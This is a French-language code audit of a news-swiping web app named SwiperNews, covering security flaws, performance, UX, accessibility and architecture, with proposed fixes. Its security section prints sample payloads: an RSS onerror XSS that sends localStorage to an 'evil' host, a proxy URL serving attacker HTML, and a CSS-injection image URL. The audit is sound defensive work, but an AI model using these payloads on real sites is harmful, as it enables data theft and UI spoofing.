# Audit technique — SwiperNews

Revue complète du dépôt à l'état `c9d051c` : `index.html` (1296 l.), `api/feed.js`,
`api/learn.js`, `sw.js`, `manifest.webmanifest`, CI et tests.
Angles couverts : sécurité, performances, expérience utilisateur, accessibilité,
architecture et maintenabilité.

---

## 1. Synthèse

L'app est **remarquablement bien tenue pour un projet « zéro build »** : normalisation
d'items unique pour toutes les sources, délégation d'événements (pas de handler par
carte), bornes explicites (`CONFIG.MAX_CARDS` / `MAX_ITEMS` / `SEEN_MAX`), garde
anti-SSRF sérieuse dans le proxy, cache local pour la peinture instantanée, CI qui
tourne. Le niveau de commentaire est au-dessus de la moyenne.

Les problèmes réels se concentrent sur trois axes :

| Axe | Constat |
|---|---|
| **Sécurité** | 3 vecteurs exploitables via un flux RSS malveillant ou via le proxy ouvert. Le durcissement s'est arrêté au SSRF. |
| **Performances** | Le fil garde jusqu'à 120 cartes plein écran dans le DOM, chacune avec une image de fond (parfois l'**original** Wikipédia, plusieurs Mo) et un `backdrop-filter`. C'est le principal risque de plantage sur mobile d'entrée de gamme. |
| **UX** | Le rendu progressif du mode Actus **re-rend tout le fil et réordonne les articles pendant la lecture**. C'est aussi la cause racine des 6 commits successifs de « fix reprise de position ». |

Ordre de traitement recommandé : **§2 (P0) → §3.1 et §3.2 (perf) → §4.1 (UX) → le reste.**
Les correctifs P0 et les gains perf les plus lourds tiennent en une petite journée.

---

## 2. Sécurité — P0

### 2.1 `stripHtml()` exécute le HTML des flux (XSS)

`index.html:516`

```js
function stripHtml(html){const d=document.createElement("div");d.innerHTML=html;return (d.textContent||"").replace(/\s+/g," ").trim();}
```

Un `div` détaché **n'est pas un document inerte** : Chrome et Firefox déclenchent bien
le chargement des ressources et les handlers `onerror`/`onload` des éléments insérés par
`innerHTML`. Un flux RSS contenant
`<description><img src=x onerror="fetch('//evil/?'+localStorage.getItem('fluxswipe.feeds.v1'))"></description>`
exécute donc du JS sur l'origine de l'app — accès à tout le `localStorage`, et sur Vercel
possibilité d'enchaîner avec §2.2.

Le vecteur est atteignable dès qu'un utilisateur importe un OPML tiers, ajoute un flux
qu'il ne contrôle pas, ou qu'une des 13 sources par défaut/suggérées est compromise.

**Correctif** (1 ligne, aucun changement de comportement) :

```js
function stripHtml(html){
  const doc=new DOMParser().parseFromString(html||"","text/html"); // document inerte
  return (doc.body.textContent||"").replace(/\s+/g," ").trim();
}
```

`DOMParser` avec `text/html` produit un document sans navigateur associé : aucune requête,
aucun script, aucun handler. Même remarque pour `imgFromHtml()` — la regex est sûre, mais
autant tout faire passer par le document inerte.

### 2.2 `api/feed.js` renvoie le `Content-Type` amont → XSS stockée sur l'origine

`api/feed.js:143-149`

```js
res.setHeader("Content-Type", upstream.headers.get("content-type") || "text/xml; charset=utf-8");
res.status(upstream.status).send(text);
```

Le proxy relaie **n'importe quel type de contenu de n'importe quelle URL publique**, sur
votre propre origine. Conséquences :

- `https://swipernews.vercel.app/api/feed?url=https://evil.com/x.html` renvoyé en
  `text/html` → le navigateur exécute le HTML de l'attaquant **sur votre domaine**
  (XSS complète, `localStorage`, cookies éventuels) ;
- servi en `application/javascript`, l'URL devient un script same-origin — donc un
  candidat à `navigator.serviceWorker.register()`, soit une **prise de contrôle
  persistante de l'origine** (le SW survit à la fermeture de l'onglet).

Le `Access-Control-Allow-Origin: *` (`api/feed.js:110`) aggrave : c'est aussi un **proxy
ouvert gratuit** que n'importe qui peut utiliser depuis n'importe quel site, à vos frais
d'exécution Vercel et sous votre réputation IP.

**Correctif :**

```js
// Toujours servir en type inoffensif, jamais celui de l'amont
res.setHeader("Content-Type", "application/xml; charset=utf-8");
res.setHeader("X-Content-Type-Options", "nosniff");
res.setHeader("Content-Disposition", "attachment"); // interdit le rendu par navigation directe
res.setHeader("Access-Control-Allow-Origin", ALLOWED_ORIGIN); // pas "*"
```

`ALLOWED_ORIGIN` = votre domaine de prod (+ `http://localhost:8000` en dev via une variable
d'environnement). Le front est same-origin : il n'a besoin d'aucun CORS. Ajouter en prime
un plafond de requêtes par IP (Vercel Edge Config / KV, ou simple compteur en mémoire par
instance) pour l'abus.

### 2.3 Injection CSS dans `card__bg` — `escAttr` ne protège pas ici

`index.html:817`

```js
`<div class="card__bg" style="background-image:url('${escAttr(img)}')"></div>`
```

`escAttr` transforme `'` en `&#39;`, mais l'attribut `style` est **décodé en HTML avant
d'être parsé en CSS** : `&#39;` redevient `'` et referme la chaîne. `safeImg()` ne
normalise pas l'URL (il renvoie `src` brut, pas `u.href`), et le parseur d'URL laisse
passer les apostrophes dans le chemin. Une image de flux du type
`https://ok.com/a');position:fixed;inset:0;z-index:99;background:url('//evil/phish.png` injecte
donc des déclarations CSS arbitraires — pas d'exécution JS sur navigateur moderne, mais
recouvrement plein écran, spoofing d'UI, exfiltration de la présence d'un article via
requête d'image.

**Correctif** — sortir l'URL du HTML :

```js
// dans cardHTML : plus d'URL dans le style
const bg = img ? `<div class="card__bg" data-bg="${escAttr(img)}"></div>` : `<div class="card__noimg"></div>`;
// après insertion (ou dans l'IntersectionObserver du §3.1)
el.style.backgroundImage = `url("${img.replace(/["\\]/g,encodeURIComponent)}")`;
```

Alternative minimale si vous tenez au HTML pur : faire renvoyer `u.href` par `safeImg()`
**et** encoder les apostrophes (`.replace(/'/g,"%27")`).

### 2.4 Le service worker met en cache tout le same-origin, `/api/*` compris

`sw.js:22-36` — le commentaire annonce « on ne met en cache que l'app-shell same-origin »,
le code met en cache **toute réponse GET same-origin**, donc :

- `/api/learn?…&n=<aléatoire>` : chaque appel a une URL unique → **le CacheStorage grandit
  sans borne** (un lot ≈ 20 items ≈ 30–60 Ko, un scroll intensif en ajoute des centaines) ;
- `/api/feed?url=…` : idem, une entrée par flux et par variante.

Le quota finit par sauter et les évictions navigateur emportent aussi l'app-shell.

**Correctif :** ne toucher qu'à la coquille.

```js
const SHELL = ["/", "/index.html", "/logo-192.png", "/logo-512.png", "/manifest.webmanifest"];
if (url.pathname.startsWith("/api/")) return; // jamais en cache
```

Voir aussi §3.4 : la stratégie *network-first* est de toute façon à inverser.

---

## 3. Performances

### 3.1 P0 — Jusqu'à 120 cartes plein écran vivantes en même temps

C'est le point le plus coûteux du projet. En mode Actus, `CONFIG.MAX_NEWS = 120` et
`render()` construit **les 120 cartes d'un coup** (`index.html:754-756`) ; `capDom()`
(qui borne à 60) n'est appelé que par le chemin `appendCards()` du mode Apprendre, jamais
par `render()`. Chaque carte porte :

- un `.card__bg` en `background-image` plein écran, avec `transform:scale(1.08)` **et**
  `filter:saturate(1.1)` → chaque carte devient une couche composite ;
- un `.rail button` en `backdrop-filter:blur(12px)` → l'un des effets les plus chers du
  moteur de rendu, **répété 120 fois**.

Résultat sur un mobile milieu de gamme : 120 images plein écran décodées et conservées
en mémoire GPU, plus 120 surfaces de flou. C'est le scénario type de l'onglet tué par
l'OS, et de la consommation data (voir §3.2).

**Correctif principal — `content-visibility`** (2 lignes de CSS, gain massif) :

```css
.card{
  content-visibility:auto;
  contain-intrinsic-size:100dvh; /* évite l'effondrement de la scrollbar */
}
```

Le navigateur saute alors entièrement le layout, le paint et le **chargement des
background-images** des cartes hors écran. Attention : `content-visibility` n'empêche pas
la requête réseau si l'image est déjà référencée dans le style inline sur certains moteurs
— d'où l'intérêt de coupler avec un `IntersectionObserver` qui pose `backgroundImage` sur
la carte courante ± 2, ce qui règle §2.3 au passage.

**Correctifs complémentaires :**

1. Appeler `capDom()` depuis `render()` aussi, ou aligner `MAX_NEWS` sur `MAX_CARDS`.
2. **Sortir le `.rail` des cartes** : un seul rail `position:fixed` pour toute l'app, qui
   agit sur la carte courante. On passe de 120 `backdrop-filter` à 1, et le DOM par carte
   fond de moitié. C'est aussi meilleur en UX (le bouton ne « saute » plus entre deux cartes).
3. Retirer `filter:saturate(1.1)` de `.card__bg` : le même rendu s'obtient en ajustant les
   couleurs du dégradé, sans couche composite supplémentaire.

### 3.2 P0 — Images Wikipédia : l'**original** est préféré au thumbnail

`index.html:553` et `api/learn.js:75` :

```js
img:(p.original&&p.original.source)||(p.thumbnail&&p.thumbnail.source)||""
```

`p.original` est le fichier source de Commons : couramment 3–8 Mo, parfois 20 Mo et plus
(scans, TIFF, panoramas). Le `thumbnail` est déjà demandé à `pithumbsize=1200`, largement
suffisant pour un fond plein écran mobile. **L'ordre est inversé.**

```js
img:(p.thumbnail&&p.thumbnail.source)||(p.original&&p.original.source)||""
```

À faire aux **deux** endroits (front et backend). C'est une ligne pour, typiquement, un
ordre de grandeur de données mobiles économisé sur un lot de 20 cartes. Envisager aussi
`pithumbsize=800` : à 800 px de large sur un écran ~400 px CSS, on reste au-dessus du DPR 2.

### 3.3 P1 — `/api/learn` en `no-store` annule l'intérêt du backend

`api/learn.js:263` :

```js
// Contenu ALÉATOIRE : pas de cache CDN, sinon le scroll infini rappelle la même URL
res.setHeader("Cache-Control", "no-store");
```

Le raisonnement est juste mais la conclusion jette le bébé : l'argumentaire du fichier
(« mutualiser le cache CDN entre tous les utilisateurs ») est **entièrement neutralisé**.
Chaque swipe de fin de lot paie 1 à 3 s d'aller-retour vers Wikipédia + GBIF + Gallica,
pour chaque utilisateur.

**Correctif — le seau aléatoire.** Le front tire un entier au lieu d'un nonce :

```js
// front : n=Math.random().toString(36) → bucket 0..11
const qs=new URLSearchParams({cats:…, sources:…, count:…, b:String(Math.floor(Math.random()*12))});
```

```js
// backend : la variante est cacheable, la variété vient du nombre de variantes
res.setHeader("Cache-Control", "s-maxage=300, stale-while-revalidate=3600");
```

12 seaux × N catégories restent très variés à l'échelle d'une session, et le CDN sert
alors la quasi-totalité des lots en ~50 ms. Variante plus fine : garder un **pool** de 100
items en cache côté CDN et faire l'échantillonnage aléatoire côté client — un seul appel
réseau alimente alors 5 lots.

### 3.4 P1 — Le service worker est *network-first* sur la coquille

`sw.js:27-35` : chaque lancement attend le réseau pour `index.html` (76 Ko, 25 Ko gzip)
avant le premier pixel. Sur 3G ou en métro, l'app installée se comporte comme un site web
lent — ce qui annule l'argument « lancement en un tap » de la bannière d'installation.

**Correctif :** *stale-while-revalidate* pour la coquille (peinture immédiate depuis le
cache, mise à jour en arrière-plan), et pré-cache à l'`install` :

```js
self.addEventListener("install", e => e.waitUntil(
  caches.open(CACHE).then(c => c.addAll(SHELL)).then(() => self.skipWaiting())
));
// fetch : cached ? (revalidate en fond, renvoie le cache) : réseau
```

Prévoir alors un signal de mise à jour (toast « nouvelle version — recharger »), sinon
l'utilisateur peut rester sur une version ancienne.

### 3.5 P1 — Le handler de scroll fait du layout synchrone à chaque événement

`index.html:919-931` — à chaque `scroll` (jusqu'à 120 Hz sur mobile récent) on enchaîne
lectures (`scrollTop`, `clientHeight`, `scrollHeight`) et écritures (`pbar.style.height`),
plus `markVisibleSeen()` et `rememberPos()` qui relisent la géométrie, et `rememberPos()`
qui fait un `JSON.stringify` + `localStorage.setItem` **synchrone** à chaque changement de
carte. `scrollHeight` sur un conteneur de 120 cartes plein écran est une lecture chère, et
elle est forcée après une écriture de style → *layout thrashing* pendant le geste.

**Correctif :**

```js
let ticking=false;
feedEl.addEventListener("scroll",()=>{
  if(ticking)return; ticking=true;
  requestAnimationFrame(()=>{ ticking=false; /* toutes les lectures ici, puis les écritures */ });
},{passive:true});
```

Mettre en cache `feedEl.clientHeight` (invalidé sur `resize`), et déplacer l'écriture
`localStorage` de `rememberPos()` dans un `requestIdleCallback` — ou mieux, l'accrocher à
l'événement **`scrollend`** (Chrome/Firefox/Safari 17+), qui est fait pour ça, avec le
`pagehide`/`visibilitychange` existants comme filet.

### 3.6 P2 — 20 requêtes concurrentes vers les proxys publics, sans annulation

`index.html:482` : `Promise.any` sur 5 proxys, pour chacun des 4 flux actifs = **20
requêtes réseau simultanées**, dont 16 sont jetées mais **continuent jusqu'au bout**
(`Promise.any` n'annule rien). Coût : batterie, données mobiles, et surtout *rate limits*
atteints d'autant plus vite sur allorigins/codetabs — donc une fiabilité qui se dégrade
justement quand on en a besoin.

**Correctif :** un `AbortController` partagé par flux, `abort()` dès qu'un proxy gagne, et
un déclenchement **échelonné** (proxy *n+1* lancé après 1,5 s seulement si *n* n'a pas
répondu) — la course simultanée n'apporte presque rien quand le premier candidat est le
backend same-origin.

### 3.7 P2 — Polices et assets

- **`@import` de Google Fonts dans le `<style>`** (`index.html:14`) : c'est le pire
  emplacement possible — le navigateur doit parser le CSS avant de découvrir l'import,
  d'où une chaîne sérialisée HTML → CSS → CSS Google → WOFF2. Remplacer par un
  `<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>` + un
  `<link rel="stylesheet">` dans le `<head>`, ou **auto-héberger les 2 polices** (~40 Ko
  en WOFF2 sous-ensemblés latin) : cohérent avec l'esprit « zéro dépendance », et supprime
  deux origines tierces du chemin critique.
- **`logo-512.png` fait 268 Ko** pour une icône : `oxipng`/`pngquant` la ramènent
  typiquement sous 40 Ko sans perte visible. `logo-192.png` (42 Ko) → ~10 Ko.
- **Pas de `vercel.json`** : aucun en-tête de cache long sur les assets immuables, aucun
  en-tête de sécurité. Voir §6.

---

## 4. Expérience utilisateur

### 4.1 P0 — Le rendu progressif remplace l'article que l'utilisateur est en train de lire

`index.html:692-701`. Chaque flux qui répond déclenche `all.sort(par date)` puis un
`render()` **complet** (`feedEl.innerHTML = …`). Avec 4 flux, le fil est donc entièrement
reconstruit 4 fois, et **réordonné** à chaque fois. Conséquences concrètes :

1. À décalage de scroll constant, l'article affiché **change d'identité** : on lit un
   article Le Monde, France 24 répond, et l'article sous les yeux devient autre chose.
2. Toutes les images sont re-décodées à chaque rendu (le `background-image` est réattaché).
3. Le hint « Swipe » **réapparaît** en pleine lecture : `render()` ne le remet à jour que
   sur `items.length===0` (`index.html:776`), sans tenir compte du scroll déjà effectué.
4. C'est la cause racine de la série de commits « fix reprise de position » : la position
   doit être re-restaurée après chaque rendu, d'où `resumePending`, le `void scrollHeight`
   forcé (`index.html:770`) et le filet en `requestAnimationFrame` (`index.html:773`).

**Correctif — rendre le fil incrémental et ancré.**

- Ne plus jamais réécrire `innerHTML` sur un fil déjà affiché. Insérer les nouveaux items
  à leur place (`insertBefore`), ou plus simple : **ne réordonner que ce qui est au-delà
  de la carte courante** — les articles déjà passés n'ont plus besoin d'être triés.
- Ancrer sur le lien : mémoriser le `link` de la carte visible avant mutation, puis
  recaler `scrollTop` sur l'index de ce même lien après. C'est exactement ce que fait
  `posMap`, mais appliqué à chaque rendu plutôt qu'au seul démarrage.
- Le `overflow-anchor` du navigateur est neutralisé par le `scroll-snap` : ne pas compter
  dessus, l'ancrage explicite est nécessaire.

### 4.2 P1 — `scroll-behavior:smooth` s'applique aussi aux affectations de `scrollTop`

`index.html:24` pose `scroll-behavior:smooth` sur `#feed`. Or, par spécification CSSOM
View, le *setter* `scrollTop` effectue un défilement avec le comportement **`auto`**, qui
résout sur la valeur calculée de `scroll-behavior` — donc **`smooth`**. Toutes les
restaurations de position (`index.html:771`, `793`, `1017`) sont donc **animées** au lieu
d'être instantanées : elles prennent des centaines de millisecondes, entrent en conflit
avec le scroll-snap et avec le geste de l'utilisateur, et peuvent être interrompues.

C'est la seconde cause racine des bugs de reprise, et la raison pour laquelle `capDom()`
(`index.html:793`) peut provoquer un à-coup visible en plein scroll infini.

**Correctif :** réserver `smooth` à la navigation clavier, et rendre les restaurations
instantanées :

```js
function setScrollTopInstant(el, top){
  el.style.scrollBehavior="auto";
  el.scrollTop=top;
  el.style.scrollBehavior="";     // rend le smooth au clavier
}
```

Ou plus propre : retirer `scroll-behavior:smooth` du CSS et passer explicitement
`behavior:"smooth"` dans les `scrollBy()` du handler clavier (`index.html:936-937`), qui
sont les seuls endroits où l'animation est souhaitée. Une fois ce point corrigé, le
`void feedEl.scrollHeight` et le filet `requestAnimationFrame` de `render()` deviennent
probablement inutiles — soit une quarantaine de lignes de complexité en moins.

### 4.3 P1 — Les raccourcis clavier tirent sous les panneaux et les champs de saisie

`index.html:935-937` : le handler est posé sur `document` sans aucune garde.

- Une **espace tapée dans le champ « https://exemple.com/rss »** fait défiler le fil
  derrière le panneau.
- Panneau *Sources* ou *Centres d'intérêt* ouvert, ↑/↓ font défiler le contenu **derrière**
  la modale.
- Pas de `preventDefault()` : sur desktop, l'espace peut déclencher un double défilement.

```js
document.addEventListener("keydown",e=>{
  if(e.target.closest("input,textarea,select,[contenteditable]"))return;
  if(document.querySelector(".sheet.open,.sharemenu.open"))return;
  const h=feedEl.clientHeight;
  if(e.key==="ArrowDown"||e.key===" "){e.preventDefault();feedEl.scrollBy({top:h,behavior:"smooth"});}
  if(e.key==="ArrowUp"){e.preventDefault();feedEl.scrollBy({top:-h,behavior:"smooth"});}
});
```

### 4.4 P1 — Le lien de partage promotionnel est en `http://`

`index.html:307` : `APP_URL: "http://news.lielu.eu"`. Ce lien part dans **chaque partage**
(WhatsApp, X, mail…). En clair : redirection supplémentaire dans le meilleur des cas,
avertissement « site non sécurisé » et blocage par certains clients dans le pire — sur le
seul canal d'acquisition de l'app. Passer en `https://`.

Dans la même veine, `index.html` n'a **ni `<meta name="description">` ni balises Open
Graph / Twitter Card**. Chaque lien partagé s'affiche donc en aperçu nu (URL brute, pas de
titre, pas d'image), alors que le partage est explicitement conçu comme la boucle de
croissance du produit. Quatre balises statiques dans le `<head>` sont le meilleur rapport
effort/impact du document :

```html
<meta name="description" content="Apprends et suis l'actu en swipe. Wikipédia, patrimoine, biodiversité et flux RSS, une carte à la fois.">
<meta property="og:title" content="SwiperNews — apprendre & actus en swipe">
<meta property="og:description" content="Le swipe qui rend plus malin.">
<meta property="og:image" content="https://…/logo-512.png">
<meta name="twitter:card" content="summary_large_image">
```

### 4.5 P2 — Accessibilité

| Point | Constat | Correctif |
|---|---|---|
| Zoom désactivé | `maximum-scale=1.0, user-scalable=no` (`index.html:5`) | Retirer : violation **WCAG 2.1 SC 1.4.4**, bloquante pour les malvoyants. Le zoom ne gêne pas un fil en scroll-snap. |
| Piège de focus | Les `role="dialog" aria-modal="true"` ne piègent pas le focus : la tabulation sort derrière la modale | `inert` sur le reste du document à l'ouverture, ou boucle de focus manuelle. `focusDialog()` (`index.html:942`) ne gère que l'entrée, pas la sortie ni le retour du focus au déclencheur. |
| Onglets | `role="tablist"`/`role="tab"` sans `aria-selected` ni `aria-controls`, et pas de `role="tabpanel"` sur `#feed` | Ajouter `aria-selected` dans `applyModeUI()` (`index.html:985`), ou passer en simple groupe de boutons `aria-pressed` — plus honnête vis-à-vis du comportement réel. |
| Chargement | Les changements d'état (`loading`/`empty`/`toast`) ne sont pas annoncés | `aria-live="polite"` sur `#toast` et sur le conteneur d'état. |
| Titre de page | Aucun `h1` ; les titres de carte sont en `h2` | Un `h1` visuellement masqué dans le `<header>`. |
| Mouvement | Animations `float`, `spin`, transitions du header | Bloc `@media (prefers-reduced-motion: reduce)` neutralisant animations et `scroll-behavior`. |

### 4.6 P2 — Divers

- **Description tronquée sans issue** : `-webkit-line-clamp:10` (`index.html:46`) coupe
  l'extrait, qui **est** le contenu en mode Apprendre. Prévoir un tap sur la description
  pour la déplier (la carte fait déjà `100dvh`, la place existe).
- **`100dvh` et la barre d'URL mobile** : `dvh` suit l'affichage dynamique, donc la
  hauteur des cartes **change** quand la barre du navigateur se rétracte, en plein
  scroll-snap → micro-sauts. Sur un fil plein écran, `100svh` (hauteur *small*, stable)
  donne un comportement plus prévisible, au prix d'une bande sous la carte.
- **Le badge « Mode démo — hors-ligne »** est positionné à `top:116px` en dur
  (`index.html:106`) alors que la hauteur du header varie selon le mode (la barre de
  catégories n'existe qu'en mode Apprendre) → chevauchement possible.
- **Favoris** : le README annonce « Favoris et bouton de partage sur chaque carte », mais
  **le bouton favori n'existe plus dans le code** (`index.html:825-827`, seul `.shareBtn`
  subsiste). Soit le réimplémenter avec persistance `localStorage` (c'est la fonction la
  plus attendue dans ce type d'app : « garder pour plus tard »), soit corriger le README
  et la section « Limites connues » qui le mentionne encore.

---

## 5. Architecture et maintenabilité

### 5.1 P1 — Logique dupliquée entre le front et le backend, sans garde-fou

`srcWikipedia`, `srcGBIF`/`normalizeGbif`, `srcGallica`/`normalizeGallica`, `CAT_TERM`,
`shuffle`, la déduplication et le classement « images d'abord » existent **en deux
exemplaires** : `index.html:527-634` et `api/learn.js`. Ils divergent déjà — le front
possède 12 catégories dans `CATEGORIES` (`index.html:348`) là où le backend en a 11 dans
`CAT_Q` (`api/learn.js:16`), et les deux implémentations de Gallica reposent sur des
parseurs différents (DOM vs regex). Toute évolution doit être faite deux fois, sans qu'un
test ne détecte l'oubli.

**Correctif :** un module partagé `src/learn-core.js` en ESM, importé par le backend
(`import`) et par le front (`<script type="module">`). **Zéro build reste respecté** : les
navigateurs cibles supportent les modules ESM nativement, et Vercel exécute de l'ESM.
Seule la partie « parsing XML » diffère légitimement (DOMParser vs regex) et peut être
injectée en paramètre.

### 5.2 P1 — 95 % de la logique est dans `index.html`, donc non testée

`npm test` couvre 2 fichiers : les gardes SSRF et les normaliseurs backend. Or les parties
les plus délicates — `fetchFeed`, `stripHtml`, `safeImg`/`safeLink`, `dropSeen`,
`parseOpmlFeeds`, `parseJsonFeeds`, `relTime`, `capDom` — vivent dans une balise `<script>`
de 940 lignes, inatteignable depuis Node. Les trois failles du §2 sont précisément dans ce
périmètre non testé, et l'historique montre 6 commits pour stabiliser une seule fonction
(la reprise de position) faute de harnais.

**Correctif progressif, sans casser le « un seul fichier » à l'exécution :**

1. Extraire les **fonctions pures** (aucun accès au DOM ni au réseau) dans `src/lib.js` :
   `stripHtml` (version DOMParser), `safeLink`, `safeImg`, `relTime`, `shuffle`,
   `dedupAndRank`, `parseOpmlFeeds`, `parseJsonFeeds`, `seenKey`, `dropSeen`.
2. `<script type="module">` dans `index.html` pour les importer — l'app reste ouvrable
   sans build, servie en HTTP (elle l'est déjà pour le SW et la PWA).
3. Tests `node --test` avec un DOM minimal (`linkedom` en devDependency, ~1 Mo, dev
   uniquement) pour les 3 fonctions qui touchent le DOM.

Cible réaliste et suffisante : une trentaine de tests couvrant l'assainissement, le
parsing OPML/JSON et la déduplication.

### 5.3 P2 — Qualité d'outillage

- `index.html` est exclu de Prettier **et** d'ESLint (`.prettierignore`, `eslint.config.js`
  ne cible que `api test`). Le fichier qui contient toute la logique est donc le seul à
  n'être ni formaté ni analysé. Une fois §5.2 fait, `src/*.js` doit entrer dans le
  périmètre du lint.
- La CI ne mesure rien : ajouter un job **Lighthouse CI** (budget performance/PWA/a11y)
  sur la preview Vercel donnerait une régression détectable pour tous les points du §3.
- `npm install` en CI plutôt que `npm ci` : installations non reproductibles alors qu'un
  `package-lock.json` existe.

---

## 6. Configuration de déploiement absente

Aucun `vercel.json`. Deux conséquences : pas d'en-têtes de sécurité, pas de cache long sur
les assets immuables. Le fichier suivant traite les deux, et la CSP verrouille l'origine
(elle est **déjà compatible** avec le code : tous les `onclick` inline ont été supprimés au
profit d'écouteurs — seul le `style` inline des cartes impose `'unsafe-inline'` pour
`style-src`, ce que le §2.3 permettrait de lever) :

```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        { "key": "X-Content-Type-Options", "value": "nosniff" },
        { "key": "Referrer-Policy", "value": "strict-origin-when-cross-origin" },
        { "key": "Permissions-Policy", "value": "geolocation=(), microphone=(), camera=()" },
        { "key": "Content-Security-Policy",
          "value": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://fr.wikipedia.org https://api.gbif.org https://gallica.bnf.fr https://api.allorigins.win https://corsproxy.io https://api.codetabs.com https://thingproxy.freeboard.io https://api.rss2json.com; frame-ancestors 'none'; base-uri 'none'" }
      ]
    },
    { "source": "/logo-(.*).png", "headers": [{ "key": "Cache-Control", "value": "public, max-age=31536000, immutable" }] }
  ]
}
```

`frame-ancestors 'none'` et `base-uri 'none'` sont gratuits et ferment le clickjacking et
le détournement d'URL relatives. Une fois les polices auto-hébergées (§3.7), les entrées
`fonts.googleapis.com` / `fonts.gstatic.com` disparaissent de la CSP.

---

## 7. Plan d'action

### Lot 1 — une demi-journée, impact maximal

| # | Action | Fichier | Gain |
|---|---|---|---|
| 1 | `stripHtml` via `DOMParser` | `index.html:516` | Ferme l'XSS §2.1 |
| 2 | `Content-Type` figé + `nosniff` + CORS restreint | `api/feed.js:110,143` | Ferme l'XSS d'origine §2.2 et le proxy ouvert |
| 3 | `thumbnail` avant `original` | `index.html:553`, `api/learn.js:75` | Divise le poids des images par ~10 |
| 4 | `content-visibility:auto` + `contain-intrinsic-size` | CSS `.card` | Supprime le coût des cartes hors écran |
| 5 | Le SW ignore `/api/*` | `sw.js` | Stoppe la croissance non bornée du cache |
| 6 | `APP_URL` en `https` + balises OG | `index.html:5-12,307` | Répare la boucle de partage |
| 7 | Garde sur les raccourcis clavier | `index.html:935` | Corrige 2 bugs d'interaction |

### Lot 2 — une à deux journées

8. Rendu incrémental et ancré du mode Actus (§4.1) — le vrai correctif des bugs de reprise.
9. Neutraliser `scroll-behavior:smooth` sur les restaurations (§4.2) — permet de supprimer les rustines de `render()`.
10. Rail unique en `position:fixed` hors des cartes (§3.1) — perf **et** UX.
11. Seaux cacheables sur `/api/learn` (§3.3) — latence divisée par ~20 sur les lots suivants.
12. Handler de scroll en `requestAnimationFrame` + `scrollend` (§3.5).
13. `vercel.json` avec CSP et cache long (§6).

### Lot 3 — fond

14. Extraction de `src/lib.js` + `src/learn-core.js`, mutualisation front/backend, tests (§5.1, §5.2).
15. Passe d'accessibilité : zoom réautorisé, piège de focus, `prefers-reduced-motion` (§4.5).
16. SW en *stale-while-revalidate* + toast de mise à jour (§3.4).
17. Polices auto-hébergées, PNG optimisés, Lighthouse CI (§3.7, §5.3).
18. Favoris persistants, ou mise à jour du README (§4.6).

---

## 8. Ce qui est déjà bien fait

À préserver lors des refactorisations :

- **Le garde anti-SSRF de `api/feed.js`** est complet et correct : résolution DNS avec
  vérification de **toutes** les adresses, IPv4 mappées en IPv6, CGNAT, métadonnées cloud.
  Meilleur que beaucoup de proxys en production.
- **La lecture plafonnée en flux** (`readCapped`) coupe au bon endroit, avant l'accumulation.
- **La délégation d'événements unique** sur `#feed` avec le registre `cardReg` : c'est la
  bonne réponse au scroll infini, et le commentaire explique pourquoi.
- **Le compteur de génération `loadSeq`** : gestion propre des chargements concurrents
  obsolètes, souvent oubliée dans ce type d'app.
- **Les bornes explicites de `CONFIG`** et l'écriture groupée de `seen` (débounce 800 ms).
- **La forme d'item normalisée** documentée en JSDoc, commune à 4 sources hétérogènes :
  c'est ce qui rend l'ajout d'une source trivial.
- **Le repli en cascade** backend → proxys → rss2json, avec cache local conservé en cas
  d'échec réseau : la bonne hiérarchie de dégradation.
